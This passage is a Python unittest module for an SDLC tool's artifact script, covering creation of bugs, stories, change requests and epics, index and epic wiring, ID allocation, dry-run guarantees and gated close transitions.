"""Unit tests for artifact.py - deterministic create + close cascade (CR0045)."""
from __future__ import annotations

import importlib.util
import sys
import tempfile
import unittest
from pathlib import Path

SCR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SCR))
sys.path.insert(0, str(Path(__file__).resolve().parent))  # tests/ dir, for the gitutil helper
from lib import sdlc_md  # noqa: E402
import validate  # noqa: E402
import reconcile  # noqa: E402


def _load():
    spec = importlib.util.spec_from_file_location("artifact", SCR / "artifact.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules["artifact"] = mod
    spec.loader.exec_module(mod)
    return mod


artifact = _load()

# A bug and a CR may not be born UNGROOMED: both creators refuse a unit `sprint plan` could not
# plan - one naming neither the files it touches nor a size (BG0136). The prose of a scaffold may
# still be deferred to whoever fills it in; the grooming may not.
# A criterion, because BG0378 made the criteria floor fire at the VERB: a unit reaching a
# delivered-terminal status with nothing stating what done looks like is refused there,
# not later by the validator. A groomed fixture is one `sprint plan` could plan AND close.

def _tick_criteria(repo, rid) -> None:
    """Tick a fixture bug's criteria, so a close ladder has an ORACLE to read.

    `Fixed` refuses a bug whose criteria are all unticked and none executable, on the same
    principle `Done` already applies to a story. A fixture standing in for a fix somebody
    checked records that with a tick - which is what the gate is asking for.
    """
    from lib import sdlc_md as _md
    path = _md.find_by_id(repo, rid)[0]
    path.write_text(path.read_text(encoding="utf-8").replace("- [ ] ", "- [x] "),
                    encoding="utf-8")


GROOM = {"affects": "src/thing.py", "points": 3, "acs": ["the defect no longer reproduces"]}
GROOM_CLI = ["--affects", "src/thing.py", "--points", "3"]
# A CR/RFC/epic is a REQUEST: it carries a T-shirt Size (S/M/L/XL), never delivery Points (BG0148).
GROOM_REQUEST = {"affects": "src/thing.py", "size": "M"}
GROOM_REQUEST_CLI = ["--affects", "src/thing.py", "--size", "M"]

# BG0144: the grooming gate now REFUSES a bug/CR whose declared `Affects` paths all fail to
# resolve on disk. Every groomed fixture that EXPECTS to be created must therefore have its
# declared path exist. Materialise the superset of paths any groomed fixture declares
# (GROOM* -> src/thing.py, the inline plannable fixtures -> src/a.py, src/b.py, src/gate.py) at
# each success site; deliberate-refusal fixtures declare no path (or a broken one) and are left alone.
_GROOM_PATHS = ("src/thing.py", "src/a.py", "src/b.py", "src/gate.py")


def _affect(root: Path, rel: str) -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text("", encoding="utf-8")


def _groom_stubs(root: Path) -> None:
    for rel in _GROOM_PATHS:
        _affect(root, rel)


def _index(repo: Path, type_: str, header: str) -> None:
    _groom_stubs(repo)  # BG0144: make declared Affects paths real so groomed creates resolve
    d = repo / sdlc_md.ARTIFACT_TYPES[type_][0]
    d.mkdir(parents=True, exist_ok=True)
    ncols = header.count("|") - 1
    sep = "| " + " | ".join(["---"] * ncols) + " |"
    (d / "_index.md").write_text(
        "# Index\n\n## Summary\n\n| Status | Count |\n| --- | --- |\n"
        "| Draft | 0 |\n| Proposed | 0 |\n| Open | 0 |\n| **Total** | **0** |\n\n"
        "## All\n\n" + header + "\n" + sep + "\n", encoding="utf-8")


def _epic(repo: Path, disp: str = "EP0001") -> None:
    d = repo / "sdlc-studio" / "epics"
    d.mkdir(parents=True, exist_ok=True)
    (d / f"{disp}-x.md").write_text(
        f"# {disp}: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n_No stories yet._\n\n"
        "## Revision History\n\n| Date | Author | Change |\n| --- | --- | --- |\n", encoding="utf-8")


def _v3(repo: Path) -> None:
    """Opt the fixture project into schema v3 (ULID ids)."""
    cfg = repo / "sdlc-studio"
    cfg.mkdir(parents=True, exist_ok=True)
    (cfg / ".config.yaml").write_text("schema_version: 3\n", encoding="utf-8")


class SchemaV3AllocationTests(unittest.TestCase):
    """US0055/RFC0024: a schema-v3 project mints ULID ids; v2 stays sequential."""

    def test_v3_mints_ulid_id(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect", dict(GROOM))
            self.assertRegex(r["id"], r"^BG-[0-9A-HJKMNP-TV-Z]{8,}$")
            self.assertEqual(r["id"], r["file_id"])   # v3: one canonical form
            self.assertTrue(r["indexed"])
            self.assertTrue(Path(r["path"]).exists())

    def test_v3_two_allocations_distinct(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            a = artifact.new(repo, "bug", "one", dict(GROOM))
            b = artifact.new(repo, "bug", "two", dict(GROOM))
            self.assertNotEqual(a["id"], b["id"])
            self.assertEqual(reconcile.detect_type("bug", repo)["drift"], [])

    def test_v2_default_stays_sequential(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "change", dict(GROOM_REQUEST))
            self.assertEqual(r["id"], "CR-0001")   # no .config.yaml -> v2 sequential

    def test_v3_findings_file_into_inbox(self) -> None:
        # US0065: under v3 a filed finding lands in `inbox` (file body + index row),
        # not the per-type create status.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect", dict(GROOM))
            self.assertIn("> **Status:** inbox", Path(r["path"]).read_text(encoding="utf-8"))
            idx = (repo / "sdlc-studio" / "bugs" / "_index.md").read_text(encoding="utf-8")
            self.assertIn("| inbox |", idx)
            self.assertEqual(reconcile.detect_type("bug", repo)["drift"], [])

    def test_v2_findings_keep_create_status(self) -> None:
        # No schema_version:3 -> a bug still files Open (era-gating leaves v2 untouched).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect", dict(GROOM))
            self.assertIn("> **Status:** Open", Path(r["path"]).read_text(encoding="utf-8"))


class BatchWiringCleanTests(unittest.TestCase):
    """US0081/CR0166: batch epic-wiring is structurally clean - no stray separator, the
    Story Breakdown is populated, and the epic section has no orphaned/empty table."""

    def test_two_epic_batch_wires_cleanly(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo, "EP0001")
            _epic(repo, "EP0002")
            artifact.new_batch(repo, "story", [
                {"title": "one", "epic": "EP0001"}, {"title": "two", "epic": "EP0001"},
                {"title": "three", "epic": "EP0002"}, {"title": "four", "epic": "EP0002"}],
                template="minimal")
            for ep, n in (("EP0001", 2), ("EP0002", 2)):
                text = (repo / "sdlc-studio" / "epics" / f"{ep}-x.md").read_text(encoding="utf-8")
                self.assertNotIn("_No stories yet._", text)      # placeholder replaced
                self.assertNotIn("\n---\n", text)                 # no stray separator
                sb = text[text.index("## Story Breakdown"):]
                sb = sb[:sb.index("## Revision")] if "## Revision" in sb else sb
                self.assertEqual(sb.count("- [ ] ["), n)          # exactly n linked stories, no empty rows


class NewTests(unittest.TestCase):
    def test_new_story_creates_wires_validates(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "do a thing", {"epic": "EP0001"})
            self.assertTrue(r["indexed"])
            self.assertTrue(r["epic_linked"])
            p = Path(r["path"])
            self.assertTrue(p.exists())
            # file validates clean (no error-severity violations)
            errs = [v for v in validate.validate_file(p, "story", repo)
                    if v["severity"] == "error" and v["rule"] != "placeholder"]
            self.assertEqual(errs, [])
            # epic breakdown now references the story; placeholder gone
            ep = (repo / "sdlc-studio" / "epics" / "EP0001-x.md").read_text()
            self.assertIn(r["id"], ep)
            self.assertNotIn("_No stories yet._", ep)
            # the type's index has 0 drift
            self.assertEqual(reconcile.detect_type("story", repo)["drift"], [])

    def test_new_cr_uses_dash_disp(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "change something", dict(GROOM_REQUEST))
            self.assertTrue(r["id"].startswith("CR-"))   # dash form
            self.assertTrue(r["file_id"].startswith("CR") and "-" not in r["file_id"])
            self.assertTrue(r["indexed"])

    def test_all_types_scaffold_validates(self) -> None:
        for t in artifact.SPEC:
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                (repo / "sdlc-studio").mkdir(parents=True)
                _groom_stubs(repo)  # BG0144: groomed types (bug/cr) need their Affects path real
                if t == "story":
                    _epic(repo)  # a story needs an existing parent epic (BG0022)
                fields = {"epic": "EP0001"} if t == "story" else {}
                if t == "bug":
                    fields.update(GROOM)  # a delivery unit is groomed with Points
                elif t == "cr":
                    fields.update(GROOM_REQUEST)  # a request is groomed with a T-shirt Size
                elif t == "charter":
                    # A charter is refused without the two things a run is materialised from,
                    # so the sweep supplies them - the same reason a story is given an epic.
                    fields.update({"goal": "a goal this run drives to",
                                   "scope": "the units this charter selects"})
                r = artifact.new(repo, t, f"a {t}", fields)
                p = Path(r["path"])
                errs = [v for v in validate.validate_file(p, t, repo)
                        if v["severity"] == "error" and v["rule"] != "placeholder"]
                self.assertEqual(errs, [], f"{t} scaffold has validate errors: {errs}")

    def test_story_requires_epic(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(ValueError):
                artifact.new(Path(d), "story", "no epic given")

    def test_row_matches_index_header_width(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            hdr = "| ID | Title | Status | Priority | Type | Date | Linked Epics |"
            _index(repo, "cr", hdr)
            artifact.new(repo, "cr", "widthcheck", dict(GROOM_REQUEST))
            idx = (repo / "sdlc-studio" / "change-requests" / "_index.md").read_text()
            row = next(l for l in idx.splitlines() if l.strip().startswith("| [CR-"))
            self.assertEqual(len(reconcile._table_cells(row)), hdr.count("|") - 1)


    def test_loose_epic_id_does_not_wire_wrong_epic(self) -> None:
        # HIGH regression: a loose id must not substring-match a padded epic. EP001 is absent
        # (only EP0010 exists), so it must RAISE rather than orphan the story (BG0022).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo, "EP0010")
            with self.assertRaises(ValueError):
                artifact.new(repo, "story", "loose ref", {"epic": "EP001"})  # not EP0010
            self.assertNotIn("loose ref", (repo / "sdlc-studio" / "epics" / "EP0010-x.md").read_text())

    def test_absent_epic_raises_no_orphan_file(self) -> None:
        # BG0022: a story for a non-existent epic must raise BEFORE writing any file.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            with self.assertRaises(ValueError):
                artifact.new(repo, "story", "orphan", {"epic": "EP9999"})
            self.assertEqual(list((repo / "sdlc-studio" / "stories").glob("US*.md")), [])

    def test_allocation_skips_lingering_index_row(self) -> None:
        # BG0022: an id whose file was deleted but whose index row remains must not be
        # re-issued (file census alone would re-use it).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _groom_stubs(repo)  # BG0144: GROOM_REQUEST declares src/thing.py
            sd = repo / "sdlc-studio" / "change-requests"; sd.mkdir(parents=True)
            (sd / "_index.md").write_text(
                "# Index\n\n## All\n\n| ID | Title | Status | Priority | Type | Date | Linked Epics |\n"
                "| --- | --- | --- | --- | --- | --- | --- |\n"
                "| [CR-0005](CR0005-x.md) | gone | Done | Medium | Feature | 2026-01-01 | - |\n",
                encoding="utf-8")  # row present, file absent
            r = artifact.new(repo, "cr", "fresh", dict(GROOM_REQUEST))
            self.assertEqual(r["file_id"], "CR0006")  # above the lingering CR0005 row, not CR0001

    def test_pipe_in_title_escaped_in_row(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            artifact.new(repo, "cr", "a | b piped", dict(GROOM_REQUEST))
            idx = (repo / "sdlc-studio" / "change-requests" / "_index.md").read_text()
            row = next(l for l in idx.splitlines() if l.strip().startswith("| [CR-"))
            cells = reconcile._table_cells(row)
            self.assertIn("a | b piped", cells)  # round-trips, column count intact
            self.assertEqual(len(cells), 7)

    def test_index_absent_is_created_then_indexed(self) -> None:
        # CR0077: a missing index is created from the template, then the row appended
        # (was: indexed=False on the greenfield first run, the misleading signal).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            (repo / "sdlc-studio").mkdir(parents=True)
            _groom_stubs(repo)  # BG0144: GROOM declares src/thing.py
            r = artifact.new(repo, "bug", "no index here", dict(GROOM))
            self.assertTrue(r["index_created"])
            self.assertTrue(r["indexed"])
            self.assertTrue(Path(r["path"]).exists())

    def test_wiring_keeps_blank_before_next_heading(self) -> None:
        # Regression: inserting an item must not orphan it against the next heading (MD032/MD022).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = repo / "sdlc-studio" / "epics" / "EP0001-x.md"
            ep.parent.mkdir(parents=True)
            ep.write_text("# EP0001: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n"
                          "- [x] [US0009: a](../stories/US0009-a.md)\n## Revision History\n\n", encoding="utf-8")
            artifact.new(repo, "story", "wired", {"epic": "EP0001"})
            out = ep.read_text().splitlines()
            h = out.index("## Revision History")
            self.assertEqual(out[h - 1].strip(), "")           # blank line before the heading
            self.assertTrue(out[h - 2].strip().startswith("- ["))  # last list item precedes the blank


    def test_wiring_preserves_prose_and_internal_blanks(self) -> None:
        # Regression (CR0053): a breakdown with prose + a list must keep its internal blank
        # lines on wire (a full rebuild collapsed them -> MD032).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = repo / "sdlc-studio" / "epics" / "EP0001-x.md"
            ep.parent.mkdir(parents=True)
            ep.write_text("# EP0001: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n"
                          "Phase 1 delivered:\n\n- [x] [US0009: a](../stories/US0009-a.md)\n\n"
                          "## Revision History\n\n", encoding="utf-8")
            artifact.new(repo, "story", "wired2", {"epic": "EP0001"})
            out = ep.read_text()
            self.assertIn("Phase 1 delivered:\n\n- [x]", out)   # prose->list blank preserved
            lines = out.splitlines()
            h = lines.index("## Revision History")
            self.assertEqual(lines[h - 1].strip(), "")            # blank before next heading

    def test_epic_without_breakdown_link_false(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            (repo / "sdlc-studio" / "epics").mkdir(parents=True)
            (repo / "sdlc-studio" / "epics" / "EP0001-x.md").write_text(
                "# EP0001: x\n\n> **Status:** Draft\n\n## Summary\n\nno breakdown section\n", encoding="utf-8")
            r = artifact.new(repo, "story", "s", {"epic": "EP0001"})
            self.assertFalse(r["epic_linked"])  # no crash, just not wired


    def test_wiring_disp_substring_not_falsely_idempotent(self) -> None:
        # HIGH regression: US0001 must wire even when US00012 is already listed (the old
        # `disp in text` substring check silently dropped it).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = repo / "sdlc-studio" / "epics" / "EP0001-x.md"
            ep.parent.mkdir(parents=True)
            ep.write_text("# EP0001: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n"
                          "- [x] [US00012: big](../stories/US00012-big.md)\n\n## Revision History\n\n",
                          encoding="utf-8")
            r = artifact.new(repo, "story", "small", {"epic": "EP0001"})
            self.assertEqual(r["id"], "US0001")
            self.assertTrue(r["epic_linked"])
            self.assertIn("[US0001:", ep.read_text())  # actually inserted, not falsely skipped


    def test_new_dry_run_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            idx = repo / "sdlc-studio" / "change-requests" / "_index.md"
            before = idx.read_text()
            r = artifact.new(repo, "cr", "preview", dict(GROOM_REQUEST), dry_run=True)
            self.assertTrue(r["dry_run"])
            self.assertFalse(Path(r["path"]).exists())
            self.assertEqual(idx.read_text(), before)

    @staticmethod
    def _drop_executable_acs(path: Path) -> None:
        """Remove the template's seeded `Verify:` line so the AC-verify gate has nothing to hold.

        Needed since BG0214: `close(dry_run=True)` now runs the real gate ladder, and the story
        scaffold declares an (unverified) executable AC. These fixtures previously passed only
        because the preview consulted no gate at all.
        """
        p = Path(path)
        out = []
        for ln in p.read_text(encoding="utf-8").splitlines():
            if "**Verify:**" in ln:
                # BG0316: an AC with NO Verify line is now refused - omission buys no discount
                # over declaring it. The fixture wants no EXECUTABLE AC, not a bare one, so the
                # executable verifier is replaced by an honestly-declared manual one with its
                # evidence rather than deleted.
                indent = ln[:len(ln) - len(ln.lstrip())]
                out.append(f"{indent}- **Verify:** manual a human confirms the scaffold is unchanged")
                out.append(f"{indent}- **Verified:** yes (2026-07-27)")
                continue
            out.append(ln)
        p.write_text("\n".join(out) + "\n", encoding="utf-8")

    def test_close_dry_run_does_not_transition(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "to keep open", {"epic": "EP0001"})
            self._drop_executable_acs(r["path"])
            before = Path(r["path"]).read_text()
            import telemetry
            res = artifact.close(repo, r["id"], dry_run=True)
            self.assertTrue(res["dry_run"])
            self.assertEqual(Path(r["path"]).read_text(), before)  # status unchanged
            self.assertEqual(telemetry.read_all(repo), [])         # no telemetry recorded

    def test_close_dry_run_refuses_exactly_what_the_real_close_refuses(self) -> None:
        """BG0214: the preview must consult the same gates the run does.

        `close(dry_run=True)` used to synthesise its answer and return before `transition` was
        ever called, so it reported `would close` for a story the real close refused, and exited
        0 where the real path exits 1. The test above cannot catch that: its story has a clean
        gate ladder, so it passes whether the preview is honest or not. This one uses a story
        the AC-verify gate REFUSES - the discriminating fixture.
        """
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "has an executable AC", {"epic": "EP0001"})
            p = Path(r["path"])
            # An executable AC with no verify-report entry: `transition -> Done` blocks on it.
            p.write_text(p.read_text() + "\n### AC1: it works\n\n- **Verify:** shell true\n",
                         encoding="utf-8")
            before = p.read_text()

            with self.assertRaises(ValueError) as dry:
                artifact.close(repo, r["id"], dry_run=True)
            with self.assertRaises(ValueError) as real:
                artifact.close(repo, r["id"])
            # Same refusal, not merely both raising.
            self.assertEqual(str(dry.exception), str(real.exception))
            self.assertIn("never verified", str(dry.exception))
            self.assertEqual(p.read_text(), before)   # and the preview still wrote nothing

    def test_orchestrated_close_dry_run_accounts_for_the_annotation_it_would_write(self) -> None:
        """The other direction of the same divergence, introduced by the BG0214 fix.

        `cmd_close` annotates `Verification depth` and only THEN transitions, but guards the
        annotation with `if not args.dry_run`. So the preview judged the un-annotated file and
        REFUSED what the real command accepts - preview and run disagreeing again, opposite way
        round. The first version of this suite hid it: a test called `transition.annotate` by
        hand before the dry run, so the workaround shipped and the defect went unnoticed.

        Driven through `main`, because the defect is in the CLI's ordering, not in `close`.
        """
        import io as _io                                   # noqa: PLC0415 - imported below in
        import contextlib as _ctx                          # noqa: PLC0415 - this module
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            _v3(repo)
            r = artifact.new(repo, "bug", "depth probe", dict(GROOM))
            _tick_criteria(repo, r["id"])   # the close ladder needs an oracle to read
            argv = ["close", "--id", r["id"], "--depth", "functional",
                    "--triaged-by", "T; agent; v1", "--root", str(repo)]
            with _ctx.redirect_stdout(_io.StringIO()), _ctx.redirect_stderr(_io.StringIO()):
                dry = artifact.main([*argv, "--dry-run"])
                real = artifact.main(argv)
            self.assertEqual((dry, real), (0, 0),
                             "the preview and the real orchestrated close disagree")

    def test_close_dry_run_still_previews_what_the_gates_allow(self) -> None:
        """The counterpart: the fix must not turn every preview into a refusal."""
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "no executable acs", {"epic": "EP0001"})
            self._drop_executable_acs(r["path"])
            res = artifact.close(repo, r["id"], dry_run=True)
            self.assertTrue(res["dry_run"])
            self.assertEqual(res["to"], "Done")


class CloseTests(unittest.TestCase):
    def test_close_unknown_prefix_raises(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(ValueError):
                artifact.close(Path(d), "ZZ0001")

    def test_close_records_telemetry_event(self) -> None:
        import telemetry
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "tel close", {"epic": "EP0001"})
            artifact.close(repo, r["id"], metrics={"iterations": 2, "critic_verdict": "approve"},
                           force=True)  # CR0084 gate bypassed: testing the close cascade
            recs = telemetry.read_all(repo)
            self.assertEqual(recs[-1]["id"], r["id"])
            self.assertEqual(recs[-1]["type"], "story")
            self.assertEqual(recs[-1]["iterations"], 2)
            self.assertEqual(recs[-1]["critic_verdict"], "approve")

    def test_close_transitions_to_terminal(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "to be closed", {"epic": "EP0001"})
            artifact.close(repo, r["id"], force=True)  # default terminal = Done (gate bypassed)
            self.assertIn("Done", Path(r["path"]).read_text())


class LazyIndexTests(unittest.TestCase):
    """CR0077 Item 1: `new` creates a missing index from templates/indexes/ on first use."""

    def test_first_artifact_creates_index_and_indexes(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)  # no _index.md anywhere - the greenfield first run
            r = artifact.new(repo, "epic", "platform foundation")
            self.assertTrue(r["index_created"], "should create the missing index")
            self.assertTrue(r["indexed"], "and append the row to it")
            idx = repo / "sdlc-studio" / "epics" / "_index.md"
            self.assertTrue(idx.exists())
            text = idx.read_text(encoding="utf-8")
            self.assertIn(r["id"], text)            # the row landed
            self.assertNotIn("{{", text)            # no leftover template placeholders

    def test_index_creation_is_idempotent(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            first = artifact.new(repo, "epic", "one")
            second = artifact.new(repo, "epic", "two")
            self.assertTrue(first["index_created"])
            self.assertFalse(second["index_created"], "must not recreate an existing index")
            self.assertTrue(second["indexed"])
            text = (repo / "sdlc-studio" / "epics" / "_index.md").read_text()
            self.assertIn(first["id"], text)
            self.assertIn(second["id"], text)       # both rows present

    def test_a_dry_run_writes_NOTHING_into_the_target_repository(self) -> None:
        """BG0574. A preview whose contract is that it writes nothing was opening the allocation
        lock in the target repository before deciding not to write anything else.

        Found by the repo-writes lane refusing a commit, then traced by instrumenting the lock
        rather than by reading it: a test drives `artifact.py new --root <the live repo>
        --dry-run`, and the only thing between that and minting artefacts into a working
        repository was a single flag. The lock has nothing to serialise on this path - a preview
        allocates no id and appends no row, and two previews naming the same candidate id is
        harmless because neither consumes it.

        Asserted over the WHOLE tree rather than over the lock alone, so the next thing a preview
        starts writing fails here too.

        Mutant: take `sdlc_md.allocation_lock(root)` unconditionally again.
        """
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            (repo / "sdlc-studio" / ".local").mkdir(parents=True)
            # The lock file ALREADY EXISTS, which is the state of every real project and of the
            # repository this defect was found in. Asserted over CONTENT rather than over the set
            # of paths: the first version of this test compared path sets, so re-opening an
            # existing file was invisible and the declared mutant survived against any tree that
            # had ever minted an artefact. It killed the mutant only because its fixture was bare.
            (repo / "sdlc-studio" / ".local" / "allocation.lock").write_text("", encoding="utf-8")

            def snapshot():
                return {p.relative_to(repo).as_posix(): (p.stat().st_size, p.stat().st_mtime_ns)
                        for p in repo.rglob("*") if p.is_file()}

            before = snapshot()
            r = artifact.new(repo, "epic", "preview", dry_run=True)
            self.assertTrue(r["dry_run"])
            after = snapshot()
            self.assertEqual(
                before, after,
                "a --dry-run wrote into the repository it was asked only to describe: "
                f"{sorted(set(after) ^ set(before)) or 'a file was rewritten in place'}")

    def test_dry_run_reports_would_create_index_without_writing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            r = artifact.new(repo, "epic", "preview", dry_run=True)
            self.assertTrue(r["would_create_index"])
            self.assertTrue(r["indexed"])
            self.assertFalse((repo / "sdlc-studio" / "epics" / "_index.md").exists())
            self.assertFalse(Path(r["path"]).exists())


class BatchTests(unittest.TestCase):
    """CR0078: many artifacts of one type in one atomic, contiguous-id pass."""

    def test_batch_creates_wires_and_keeps_drift_zero(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            items = [{"title": "rest conventions", "epic": "EP0001"},
                     {"title": "auth middleware", "epic": "EP0001"},
                     {"title": "persistence", "epic": "EP0001"}]
            r = artifact.new_batch(repo, "story", items)
            self.assertEqual(r["count"], 3)
            ids = [c["id"] for c in r["created"]]
            self.assertEqual(ids, ["US0001", "US0002", "US0003"])  # contiguous block
            ep = (repo / "sdlc-studio" / "epics" / "EP0001-x.md").read_text()
            for i in ids:
                self.assertIn(i, ep)                               # each wired to the epic
            self.assertEqual(reconcile.detect_type("story", repo)["drift"], [])  # counts in sync

    def test_batch_defaults_to_full_template(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new_batch(repo, "story", [{"title": "x", "epic": "EP0001"}])
            self.assertEqual(r["template"], "full")
            self.assertIn("## Context", Path(r["created"][0]["path"]).read_text())  # rich body

    def test_batch_is_atomic_on_bad_epic(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            items = [{"title": "good", "epic": "EP0001"}, {"title": "bad", "epic": "EP9999"}]
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story", items)
            self.assertEqual(list((repo / "sdlc-studio" / "stories").glob("US*.md")), [])

    def test_batch_dry_run_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new_batch(repo, "story", [{"title": "x", "epic": "EP0001"}], dry_run=True)
            self.assertTrue(r["dry_run"])
            self.assertEqual(r["ids"][0]["id"], "US0001")
            self.assertEqual(list((repo / "sdlc-studio" / "stories").glob("US*.md")), [])


class FullTemplateTests(unittest.TestCase):
    """CR0077 Item 2: `--template full` grafts the rich core body onto the provenance head."""

    def test_full_epic_has_rich_sections_and_provenance(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            r = artifact.new(repo, "epic", "rich epic", {"template": "full"})
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("**Created-by:** sdlc-studio new", text)   # provenance head intact
            self.assertIn("## Inherited Constraints", text)      # a section only the full body has
            self.assertTrue(text.startswith(f"# {r['id']}: rich epic"))
            errs = [v for v in validate.validate_file(Path(r["path"]), "epic", repo)
                    if v["severity"] == "error" and v["rule"] != "placeholder"]
            self.assertEqual(errs, [], f"full scaffold should validate clean: {errs}")

    def test_minimal_is_default_and_lean(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            r = artifact.new(repo, "epic", "lean epic")  # no template -> minimal
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertNotIn("## Inherited Constraints", text)   # minimal stays terse
            self.assertIn("**Created-by:** sdlc-studio new", text)


class SubsectionPreservationTests(unittest.TestCase):
    """BG0113: a supplied field replaces a section's prose body but keeps the template's
    `###` subsection scaffold prompts beneath the `##` heading, so an agent filling the
    artefact keeps the guidance rather than losing it."""

    def test_fix_keeps_files_modified_and_tests_added_prompts(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _groom_stubs(repo)  # BG0144: GROOM declares src/thing.py
            r = artifact.new(repo, "bug", "dropped subsection",
                             {**GROOM, "template": "full", "fix": "swap the greedy regex"})
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("swap the greedy regex", text)       # supplied prose landed
            self.assertIn("### Files Modified", text)           # scaffold prompt preserved
            self.assertIn("### Tests Added", text)

    def test_put_section_preserves_subsections(self) -> None:
        body = ("## Proposed Fix\n\n> *hint*\n\n{{fix_description}}\n\n"
                "### Files Modified\n\n| File | Change |\n| --- | --- |\n\n"
                "## Revision History\n\n| Date | Author | Change |\n")
        out = artifact._put_section(body, ("Proposed Fix", "Fix"), "the actual fix\n")
        self.assertIn("the actual fix", out)
        self.assertIn("### Files Modified", out)
        self.assertNotIn("{{fix_description}}", out)   # prose body replaced
        self.assertIn("## Revision History", out)       # next ## untouched


class ProjectTemplateTests(unittest.TestCase):
    """RFC-0023 write path: `new` scaffolds the project's declared template
    (conventions.templates.<type>) so the scaffold matches the house shape the
    read-side checks expect - the skill default stays the fallback."""

    HOUSE = ("<!-- house bug template -->\n\n# {{id}}: {{title}}\n\n"
             "## Symptom\n\n{{symptom}}\n\n## Root cause\n\n{{cause}}\n\n"
